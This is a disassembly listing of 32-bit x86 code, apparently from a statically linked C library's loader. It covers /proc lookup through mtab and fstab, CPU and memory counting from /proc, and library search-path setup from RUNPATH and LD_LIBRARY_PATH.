test eax, eax
je 0x807a800
leave
jmp fcn.0807a7a0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov dword [var_38h], 0
mov dword [var_34h], edx
mov dword [var_30h], eax
mov dword [var_4h], 0x80a4e5b
mov dword [esp], str._etc_mtab
call fcn.08090280
test eax, eax
mov ebx, eax
je 0x807a90c
mov dword [var_4h], 2
mov dword [esp], ebx
call fcn.08076c00
mov eax, dword [var_34h]
mov dword [esp], ebx
mov dword [var_ch], eax
mov eax, dword [var_30h]
mov dword [var_8h], eax
lea eax, [var_2ch]
mov dword [var_4h], eax
call fcn.080903d0
test eax, eax
je 0x807a8bd
mov esi, dword [var_24h]
mov edi, str.proc
mov ecx, 5
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807a884
mov eax, dword [var_28h]
mov dword [var_38h], eax
mov dword [esp], ebx
call fcn.08090300
mov eax, dword [var_38h]
test eax, eax
je 0x807a905
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08076e80
mov edx, eax
mov eax, dword [var_38h]
test edx, edx
je 0x807a8f3
xor eax, eax
lock cmpxchg dword [0x80aad98], edx
test eax, eax
jne 0x807a8fb
mov eax, dword [0x80aad98]
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], edx
call fcn.08051180
jmp 0x807a8ee
mov eax, str._proc
jmp 0x807a8f3
mov dword [var_4h], 0x80a4e5b
mov dword [esp], str._etc_fstab
call fcn.08090280
test eax, eax
mov ebx, eax
jne 0x807a874
jmp 0x807a905
lea esi, [esi]
push ebp
mov edx, 0x2000
mov ebp, esp
push edi
push esi
lea eax, [ebp - 0x200c]
push ebx
sub esp, 0x2010
mov dword [ebp - 0x2010], 1
call fcn.0807a840
test eax, eax
mov esi, eax
je 0x807aa26
mov dword [esp], eax
call fcn.08053400
add eax, 0x1b
and eax, 0xfffffffc
sub esp, eax
lea edi, [arg_1bh]
mov dword [var_4h], esi
and edi, 0xfffffff0
mov dword [esp], edi
call fcn.080773c0
mov dword [eax], 0x6174732f
mov word [eax + 4], 0x74
mov dword [esp], edi
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807aa34
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
lea eax, [ebp - 0x200c]
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], eax
call fcn.08076c40
test eax, eax
je 0x807aa1e
mov edi, 0x80a35a1
mov ecx, 3
lea esi, [ebp - 0x200c]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807a9c3
movsx eax, byte [ebp - 0x2009]
mov edx, dword [ebp - 0x2010]
sub eax, 0x30
cmp eax, 9
setbe al
inc edx
test al, 1
cmove edx, dword [ebp - 0x2010]
mov dword [ebp - 0x2010], edx
jmp 0x807a9c3
mov dword [esp], ebx
call fcn.08049dc0
mov eax, dword [ebp - 0x2010]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], esi
mov dword [esp], edi
call fcn.080773c0
mov dword [esp], eax
mov dword [var_8h], 9
mov dword [var_4h], str._cpuinfo
call fcn.08053740
mov dword [esp], edi
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807aa26
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
lea eax, [ebp - 0x200c]
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], eax
call fcn.08076c40
test eax, eax
je 0x807aa1e
mov ecx, 9
mov edi, str.processor
lea esi, [ebp - 0x200c]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
mov edx, dword [ebp - 0x2010]
seta cl
setb al
inc edx
cmp cl, al
cmovne edx, dword [ebp - 0x2010]
mov dword [ebp - 0x2010], edx
jmp 0x807aa88
nop
lea esi, [esi]
push ebp
mov edx, 0x2000
mov ebp, esp
push edi
push esi
lea edi, [ebp - 0x200c]
push ebx
sub esp, 0x2014
mov dword [ebp - 0x2010], 0xffffffff
mov dword [ebp - 0x2014], eax
mov eax, edi
call fcn.0807a840
test eax, eax
mov esi, eax
je 0x807abed
mov dword [esp], eax
call fcn.08053400
add eax, 0x1b
and eax, 0xfffffffc
sub esp, eax
lea ebx, [arg_1bh]
mov dword [var_4h], esi
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.080773c0
mov dword [var_4h], str._meminfo
mov dword [var_8h], 9
mov dword [esp], eax
call fcn.08053740
mov dword [esp], ebx
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807abed
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], edi
call fcn.08076c40
test eax, eax
je 0x807abe5
lea eax, [ebp - 0x2010]
mov dword [esp], edi
mov dword [var_8h], eax
mov eax, dword [ebp - 0x2014]
mov dword [var_4h], eax
call fcn.08049be0
dec eax
jne 0x807ab87
call fcn.080546b0
mov esi, dword [ebp - 0x2010]
cmp eax, 0xffffffff
lea edx, [eax + 0x3ff]
mov ecx, eax
cmovle ecx, edx
mov eax, esi
sar ecx, 0xa
cdq
idiv ecx
mov dword [ebp - 0x2010], eax
mov dword [esp], ebx
call fcn.08049dc0
mov ebx, dword [ebp - 0x2010]
cmp ebx, 0xffffffff
je 0x807ac02
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
call fcn.08048b20
mov dword [eax], 0x26
jmp 0x807abf8
nop
push ebp
mov eax, str.MemTotal:__ld_kB
mov ebp, esp
leave
jmp 0x807aae0
mov esi, esi
push ebp
mov eax, str.MemFree:__ld_kB
mov ebp, esp
leave
jmp 0x807aae0
nop
nop
mov eax, dword [0x80aac44]
push ebp
mov edx, 0x64
mov ebp, esp
leave
test eax, eax
cmove eax, edx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
test eax, eax
mov edi, dword [arg_8h]
je 0x807ad3b
mov dword [esp], 3
call section.
mov eax, dword [eax]
xor esi, esi
mov ebx, dword [eax + 0x50]
cmp byte [ebx], 0
je 0x807ad32
mov dword [var_4h], ebx
mov dword [esp], edi
call fcn.08076e50
test eax, eax
je 0x807ad36
mov dword [esp], ebx
mov dword [var_4h], 0
inc esi
call fcn.080537a0
cmp byte [eax + 1], 0
lea ebx, [eax + 1]
jne 0x807acb5
xor eax, eax
test al, al
je 0x807ad32
mov eax, 0
test eax, eax
je 0x807ad2b
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x6c]
mov eax, 0
add ebx, esi
test eax, eax
je 0x807ad24
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + ebx*4 + 0x24]
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x807ad16
mov eax, dword [0x80a9ab4]
jmp 0x807acfa
xor eax, eax
jmp 0x807ad1c
movzx eax, byte [ebx]
jmp 0x807ace1
mov eax, dword [0x80a9ab4]
jmp 0x807aca5
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
test edx, edx
mov eax, ebx
je 0x807ada2
mov ecx, dword [edx]
shr eax, cl
cmp eax, dword [edx + 4]
jae 0x807ada0
mov esi, dword [edx + eax*4 + 0x14]
test esi, esi
je 0x807ada0
mov ecx, dword [edx + 8]
mov eax, ebx
shr eax, cl
and eax, dword [edx + 0xc]
lea eax, [edx + eax*4]
mov ecx, dword [esi + eax]
test ecx, ecx
je 0x807ada0
mov eax, ebx
and eax, dword [edx + 0x10]
lea eax, [edx + eax*4]
add ebx, dword [ecx + eax]
lea esi, [esi]
mov eax, ebx
mov ebx, dword [esp]
mov esi, dword [var_4h]
leave
ret
nop
nop
nop
nop
nop
mov eax, dword [0x80aa844]
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
test eax, eax
jne 0x807add1
cmp ebx, 0x10000
setbe al
mov ebx, dword [esp]
leave
movzx eax, al
ret
call section.
cmp ebx, dword [eax + 0x41c]
jmp 0x807adc6
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
xor edi, edi
mov ecx, dword [arg_ch]
push esi
mov esi, dword [arg_10h]
push ebx
movzx eax, byte [ecx]
cmp al, 0x7b
je 0x807aea0
xor ebx, ebx
cmp al, byte [esi]
je 0x807ae88
movzx edx, byte [ecx]
mov eax, edi
test al, al
je 0x807ae71
xor eax, eax
cmp dl, 0x7d
je 0x807ae34
pop ebx
pop esi
pop edi
leave
ret
dec ecx
add ebx, 2
mov esi, dword [arg_18h]
test esi, esi
jne 0x807ae43
mov eax, ebx
jmp 0x807ae2f
movzx eax, byte [ebx + ecx]
test al, al
je 0x807ae5a
mov edx, dword [arg_14h]
test edx, edx
je 0x807ae56
cmp al, 0x3a
je 0x807ae5a
xor eax, eax
jmp 0x807ae2f
mov eax, dword [arg_8h]
inc eax
cmp ecx, eax
je 0x807ae3f
mov eax, dword [arg_14h]
test eax, eax
je 0x807ae56
cmp byte [ecx - 2], 0x3a
jne 0x807ae56
jmp 0x807ae3f
test dl, dl
je 0x807ae38
cmp dl, 0x2f
je 0x807ae38
mov edi, dword [arg_14h]
test edi, edi
je 0x807ae56
cmp dl, 0x3a
jne 0x807ae56
jmp 0x807ae38
test al, al
je 0x807ae1f
lea esi, [esi]
inc ebx
movzx edx, byte [ebx + ecx]
cmp dl, byte [ebx + esi]
jne 0x807ae22
test dl, dl
jne 0x807ae90
jmp 0x807ae22
inc ecx
mov edi, 1
movzx eax, byte [ecx]
jmp 0x807ae19
mov esi, esi
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x14
mov ebx, dword [arg_8h]
mov esi, ebx
mov eax, dword [0x80a95f4]
inc ebx
mov dword [var_8h], str.ORIGIN
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
je 0x807af0d
inc edi
lea eax, [eax + ebx]
mov dword [var_4h], 0x24
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ebx, eax
jne 0x807aec0
add esp, 0x14
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_8h], str.PLATFORM
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
jne 0x807aee9
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_8h], 0x80a362c
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
je 0x807aeea
jmp 0x807aee9
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov esi, dword [arg_10h]
mov ebx, dword [arg_ch]
mov dword [var_14h], esi
mov dword [var_10h], ebx
movzx eax, byte [ebx]
cmp al, 0x24
je 0x807afac
mov byte [esi], al
inc ebx
mov eax, dword [arg_14h]
inc esi
test eax, eax
je 0x807afa7
movzx eax, byte [ebx]
cmp al, 0x3a
je 0x807afa2
mov esi, esi
test al, al
jne 0x807af78
mov byte [esi], 0
mov eax, dword [arg_10h]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_14h], esi
jmp 0x807af90
movzx eax, byte [ebx]
jmp 0x807af90
mov eax, dword [0x80a95f4]
mov edx, dword [var_10h]
inc ebx
mov dword [var_8h], str.ORIGIN
mov dword [var_4h], ebx
mov dword [var_sp_10h], eax
mov dword [esp], edx
mov eax, dword [arg_14h]
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807b049
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x190]
test eax, eax
je 0x807affe
cmp eax, 0xffffffff
je 0x807affe
mov dword [esp], esi
mov dword [var_4h], eax
add ebx, edi
call fcn.080773c0
mov esi, eax
jmp 0x807afa7
cmp edi, 1
jbe 0x807b040
add ebx, edi
mov esi, dword [var_14h]
movzx eax, byte [ebx]
test al, al
je 0x807af94
mov ecx, dword [arg_14h]
test ecx, ecx
jne 0x807b032
inc ebx
movzx eax, byte [ebx]
test al, al
je 0x807af94
mov edx, dword [arg_14h]
test edx, edx
je 0x807b016
cmp al, 0x3a
jne 0x807b016
jmp 0x807af90
cmp al, 0x3a
jne 0x807b016
jmp 0x807af90
nop
lea esi, [esi]
mov byte [esi], 0x24
inc esi
jmp 0x807afa7
mov eax, dword [arg_14h]
mov edx, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_8h], str.PLATFORM
mov dword [var_4h], ebx
mov dword [var_ch], eax
mov dword [esp], edx
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807b07f
mov eax, dword [0x80aac34]
jmp 0x807afe3
mov eax, dword [arg_14h]
mov edx, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_8h], 0x80a362c
mov dword [var_4h], ebx
mov dword [var_ch], eax
mov dword [esp], edx
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807affe
mov eax, 0x8093da3
jmp 0x807afe3
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_8h], esi
mov dword [var_4h], 0x24
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
mov dword [var_bp_4h], edi
xor ebx, ebx
mov edi, dword [arg_8h]
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
jne 0x807b1c3
test ebx, ebx
jne 0x807b12b
mov dword [esp], esi
call fcn.08053400
lea ebx, [eax + 1]
mov dword [esp], ebx
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x807b11e
mov dword [var_sp_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov eax, edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov dword [esp], esi
call fcn.08053400
mov dword [var_10h], eax
mov eax, dword [edi + 0x190]
test eax, eax
jne 0x807b1b2
mov eax, dword [edi + 4]
cmp byte [eax], 0
jne 0x807b1da
call fcn.08083280
test eax, eax
mov dword [edi + 0x190], eax
je 0x807b1ae
cmp eax, 0xffffffff
je 0x807b1ae
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
mov edx, dword [var_10h]
sub eax, 7
imul ebx, eax
lea eax, [ebx + edx + 1]
mov dword [esp], eax
call fcn.08050fe0
mov edx, eax
xor eax, eax
test edx, edx
je 0x807b120
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], edx
mov dword [var_4h], esi
mov dword [esp], edi
call fcn.0807af60
jmp 0x807b120
xor edx, edx
jmp 0x807b16a
xor edx, edx
cmp eax, 0xffffffff
je 0x807b16a
mov dword [esp], eax
call fcn.08053400
jmp 0x807b168
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.0807aeb0
mov ebx, eax
jmp 0x807b0ef
mov dword [var_sp_ch], str.expand_dynamic_string_token
mov dword [var_sp_8h], 0x13d
mov dword [var_4h], str.dl_load.c
mov dword [esp], str._l___l_name_0___0
call fcn.0805efc0
mov esi, esi
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
mov esi, edx
push ebx
sub esp, 0x14
mov ebx, dword [eax + 0x14]
test ebx, ebx
je 0x807b22f
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08076e50
test eax, eax
je 0x807b27b
mov edi, ebx
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x807b214
mov dword [esp], esi
call fcn.08053400
lea edx, [eax + 1]
add eax, 0xd
mov dword [var_10h_2], edx
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b283
test edi, edi
je 0x807b298
mov edx, dword [var_10h_5]
lea eax, [eax + 0xc]
mov dword [var_4h_2], esi
mov dword [esp], eax
mov dword [var_ch_2], edx
call fcn.08053770
mov dword [ebx + 8], 0
mov dword [ebx + 4], 0
mov dword [ebx], eax
mov dword [edi + 4], ebx
lea esp, [var_ch_4]
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
mov edx, esi
mov eax, 0xc
mov dword [esp], str.cannot_allocate_name_record
call fcn.08081200
mov dword [esp + 0xc], 0x80a3689
mov dword [esp + 8], 0x162
mov dword [var_4h_2], str.dl_load.c
mov dword [esp], str.lastp_____void__0_
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov dword [var_14h], 0
mov eax, dword [var_10h_3]
lea edx, [var_4h_2]
mov dword [esp], edx
mov dword [var_4h_3], eax
call fcn.0808ddc0
test eax, eax
mov ebx, eax
je 0x807b511
mov dword [esp], ebx
call fcn.08053400
mov dword [var_10h_4], 0x80a35fc
test eax, eax
mov dword [var_18h], eax
cmove ebx, dword [var_10h_4]
cmp eax, 1
mov dword [var_10h_4], ebx
jbe 0x807b317
cmp byte [eax + ebx - 1], 0x2f
je 0x807b4f2
mov eax, dword [var_18h]
test eax, eax
je 0x807b333
mov eax, dword [var_10h_5]
mov edx, dword [var_18h_2]
cmp byte [edx + eax - 1], 0x2f
je 0x807b333
mov byte [edx + eax], 0x2f
inc edx
mov dword [var_18h_2], edx
mov eax, dword [var_10h_2]
test eax, eax
jne 0x807b489
mov ebx, dword [0x80aac68]
test ebx, ebx
je 0x807b35a
mov eax, dword [var_18h_2]
cmp dword [ebx + 0x10], eax
je 0x807b44e
mov ebx, dword [ebx]
test ebx, ebx
jne 0x807b348
mov eax, dword [var_1ch_2]
xor esi, esi
test eax, eax
je 0x807b371
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08053400
lea esi, [eax + 1]
mov eax, dword [0x80aa9ec]
mov edx, dword [var_18h]
lea eax, [esi + eax*4]
lea eax, [edx + eax + 0x15]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b528
mov eax, dword [0x80aa9ec]
mov edx, dword [var_10h_5]
lea eax, [ebx + eax*4 + 0x14]
mov dword [ebx + 0xc], eax
mov dword [var_4h_3], edx
mov eax, dword [var_18h_2]
mov dword [esp + 8], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call fcn.08053740
mov byte [eax], 0
mov ecx, dword [0x80aa9ec]
mov edx, dword [var_10h_5]
mov eax, dword [var_18h_2]
mov dword [ebx + 0x10], eax
mov eax, dword [0x80aa9fc]
cmp dword [var_18h_2], eax
cmova eax, dword [var_18h_2]
mov dword [0x80aa9fc], eax
xor eax, eax
cmp byte [edx], 0x2f
setne al
xor edx, edx
add eax, eax
cmp edx, ecx
jae 0x807b3f9
lea esi, [esi]
mov dword [ebx + edx*4 + 0x14], eax
inc edx
cmp edx, ecx
jb 0x807b3f0
mov edi, dword [var_18h]
mov eax, dword [var_1ch]
test edi, edi
mov dword [ebx + 4], eax
je 0x807b445
mov edx, dword [var_18h_2]
lea eax, [ebx + ecx*4]
mov dword [var_ch_5], esi
lea eax, [eax + edx + 0x15]
mov edx, dword [var_18h]
mov dword [esp], eax
mov dword [var_4h_3], edx
call fcn.08053770
mov dword [ebx + 8], eax
mov eax, dword [0x80aac68]
mov dword [ebx], eax
mov dword [0x80aac68], ebx
mov eax, dword [var_14h_2]
mov edx, dword [var_ch_5]
mov dword [edx + eax*4], ebx
inc eax
mov dword [var_14h_2], eax
jmp 0x807b2d0
mov dword [ebx + 8], 0
jmp 0x807b426
mov edi, dword [ebx + 0xc]
mov esi, dword [var_10h_5]
cmp eax, eax
cld
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807b354
test ebx, ebx
je 0x807b35a
xor eax, eax
cmp eax, dword [var_14h_2]
jae 0x807b47e
mov edx, dword [var_ch_5]
cmp dword [edx + eax*4], ebx
je 0x807b47e
inc eax
cmp eax, dword [var_14h_2]
jb 0x807b470
cmp eax, dword [var_14h_2]
jne 0x807b2d0
jmp 0x807b433
mov eax, dword [var_10h_4]
mov dword [var_1ch], str._lib_
mov dword [var_20h], 1
cmp byte [eax], 0x2f
jne 0x807b2d0
xor ebx, ebx
mov edx, dword [ebx*4 + 0x80a35f4]
cmp dword [var_18h], edx
mov dword [var_24h], edx
je 0x807b4d7
mov edx, dword [var_1ch]
mov eax, dword [var_24h]
inc ebx
cmp ebx, 1
lea edx, [eax + edx + 1]
mov dword [var_1ch], edx
jbe 0x807b4a5
mov eax, dword [var_20h]
test eax, eax
jne 0x807b2d0
jmp 0x807b33e
mov eax, dword [var_18h]
mov esi, dword [var_1ch]
mov edi, dword [var_10h_4]
cld
cmp eax, eax
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807b4b4
mov dword [var_sp_10h], 0
jmp 0x807b4c7
dec dword [var_18h_2]
cmp dword [var_18h_2], 1
jbe 0x807b317
mov eax, dword [var_10h_5]
mov edx, dword [var_18h_2]
cmp byte [edx + eax - 1], 0x2f
je 0x807b4f2
jmp 0x807b317
mov eax, dword [var_14h]
mov edx, dword [var_ch_2]
mov dword [edx + eax*4], 0
lea esp, [var_ch_3]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
xor edx, edx
mov eax, 0xc
mov dword [esp], str.cannot_create_cache_for_search_path
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x24
mov eax, dword [ecx + 4]
mov dword [var_10h_5], edx
mov dword [var_14h_2], eax
mov eax, dword [0x80aac70]
test eax, eax
jne 0x807b60b
mov eax, dword [var_10h_5]
mov dword [esp], ecx
mov dword [var_4h_4], eax
call fcn.0807b0c0
mov esi, eax
mov eax, str.cannot_create_RUNPATH_RPATH_copy
test esi, esi
je 0x807b5fa
movzx eax, byte [esi]
xor ebx, ebx
mov ecx, esi
test al, al
je 0x807b59b
mov edx, eax
cmp dl, 0x3a
lea eax, [ebx + 1]
cmove ebx, eax
inc ecx
movzx eax, byte [ecx]
test al, al
mov edx, eax
jne 0x807b588
lea eax, [ebx*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b5f5
mov edx, dword [var_14h_2]
mov eax, dword [var_4h_3]
mov dword [esp + 0xc], 0
mov dword [esp + 8], 0x80a36b1
mov dword [var_4h_4], ebx
mov dword [esp], esi
mov dword [var_sp_14h], edx
mov dword [var_sp_10h], eax
call fcn.0807b2c0
mov dword [esp], esi
call fcn.08051180
mov dword [edi], ebx
mov dword [edi + 4], 1
lea esp, [var_ch_4]
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, str.cannot_create_cache_for_search_path
mov dword [esp], eax
xor ecx, ecx
xor edx, edx
mov eax, 0xc
call fcn.08081200
mov edx, dword [0x80a95f4]
test edx, edx
jne 0x807b561
mov edx, dword [var_14h_2]
mov ebx, eax
movzx eax, byte [eax]
movzx edx, byte [edx]
mov byte [var_15h], dl
cmp al, byte [var_15h]
mov esi, dword [var_14h_2]
je 0x807b689
mov esi, dword [var_14h_2]
movzx edx, byte [esi]
test dl, dl
jne 0x807b641
test al, al
je 0x807b666
cmp al, 0x3a
je 0x807b666
test al, al
je 0x807b561
inc ebx
cmp al, 0x3a
je 0x807b65a
movzx eax, byte [ebx]
test al, al
jne 0x807b649
jmp 0x807b561
movzx eax, byte [ebx]
test al, al
jne 0x807b627
jmp 0x807b561
mov dword [var_4h_4], 4
mov dword [esp], 1
call fcn.08051730
test eax, eax
mov ebx, eax
jne 0x807b5e2
jmp 0x807b5f5
test al, al
je 0x807b62f
inc ebx
inc esi
movzx eax, byte [ebx]
movzx edx, byte [esi]
cmp al, dl
jne 0x807b635
test al, al
jne 0x807b68d
jmp 0x807b635
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_ch]
mov edx, dword [ebx]
cmp edx, 0xffffffff
je 0x807b6d4
test edx, edx
mov eax, 1
jne 0x807b6d4
mov eax, dword [arg_10h]
mov edx, dword [ecx + eax*4 + 0x18]
test edx, edx
jne 0x807b6d9
xor eax, eax
mov dword [ebx], 0xffffffff
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ecx + 0x2c]
mov edx, dword [edx + 4]
add edx, dword [eax + 4]
mov eax, dword [arg_14h]
mov dword [esp], eax
mov eax, ebx
call fcn.0807b540
sub esp, 4
mov eax, 1
jmp 0x807b6d4
lea esi, [esi]
push ebp
mov ecx, 0x80aa9ec
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov edx, dword [0x80aac0c]
mov dword [var_10h], eax
mov eax, dword [0x80aac34]
mov dword [esp], 0x80aa9f0
call fcn.08056330
sub esp, 4
mov dword [0x80aa9e8], eax
mov dword [esp], 0xc
call fcn.08050fe0
test eax, eax
mov dword [0x80aa9f4], eax
mov esi, eax
je 0x807b917
mov edx, dword [0x80aa9ec]
mov eax, 0xcccccccd
lea edx, [edx*4 + 0x27]
mul edx
shr edx, 4
lea edx, [edx + edx*4]
mov eax, edx
mov dword [var_14h_3], edx
shl eax, 6
mov dword [esp], eax
call fcn.08050fe0
mov edx, str.cannot_create_cache_for_search_path
mov dword [esi], eax
mov eax, dword [0x80aa9f4]
mov eax, dword [eax]
test eax, eax
je 0x807b91c
mov dword [0x80aac68], eax
mov ecx, eax
mov dword [0x80aa9f8], 0
mov eax, dword [var_14h_3]
mov edi, str._lib_
xor ebx, ebx
shl eax, 2
mov dword [var_18h_3], eax
lea esi, [esi]
mov eax, dword [ebx*4 + 0x80a35f4]
mov dword [ecx + 0xc], edi
mov dword [esi], ecx
mov dword [ecx + 4], 0x80a36b3
mov dword [ecx + 8], 0
add esi, 4
mov dword [ecx + 0x10], eax
lea edi, [eax + edi + 1]
mov eax, dword [ecx + 0xc]
cmp byte [eax], 0x2f
jne 0x807b92d
mov edx, dword [0x80aa9ec]
xor eax, eax
cmp eax, edx
jae 0x807b7fd
lea esi, [esi]
mov dword [ecx + eax*4 + 0x14], 0
inc eax
cmp eax, edx
jb 0x807b7f0
mov eax, dword [var_18h_3]
inc ebx
lea edx, [eax + ecx]
xor eax, eax
cmp ebx, 2
cmovne eax, edx
cmp ebx, 1
mov dword [ecx], eax
mov ecx, edx
jbe 0x807b7b0
mov ebx, dword [var_10h_3]
mov dword [0x80aa9fc], 9
mov dword [esi], 0
test ebx, ebx
je 0x807b834
mov eax, dword [var_10h_3]
cmp byte [eax], 0
jne 0x807b850
mov dword [0x80aa9e0], 0xffffffff
mov eax, dword [0x80aac68]
mov dword [0x80aac50], eax
lea esp, [ebp - 0xc]
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], eax
mov ebx, eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_27h]
mov dword [var_8h], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov ecx, 1
mov esi, eax
movzx eax, byte [ebx]
test al, al
je 0x807b89d
sub eax, 0x3a
lea edx, [ecx + 1]
cmp al, 1
cmovbe ecx, edx
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x807b88a
lea eax, [ecx*4 + 4]
mov dword [esp], eax
call fcn.08050fe0
mov edx, str.cannot_create_cache_for_search_path
test eax, eax
mov ecx, eax
mov dword [0x80aa9e0], eax
je 0x807b91c
mov eax, dword [0x80a95f4]
mov dword [var_4h], ecx
mov dword [var_18h], 0
mov dword [var_14h], str.LD_LIBRARY_PATH
mov dword [var_8h], 0x80a36c6
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807b2c0
mov eax, dword [0x80aa9e0]
mov ecx, dword [eax]
test ecx, ecx
je 0x807b903
mov dword [0x80aa9e4], 0
jmp 0x807b83e
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aa9e0], 0xffffffff
jmp 0x807b8f4
mov edx, str.cannot_create_search_path_array
mov dword [esp], edx
xor ecx, ecx
mov eax, 0xc
xor edx, edx
call fcn.08081200
mov dword [var_ch], str._dl_init_paths
mov dword [var_8h], 0x2a2
mov dword [var_4h], str.dl_load.c
mov dword [esp], str.pelem__dirname_0____
call fcn.0805efc0
jmp fcn.0807b960
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [var_8h]
mov dword [var_bp_4h], ebx
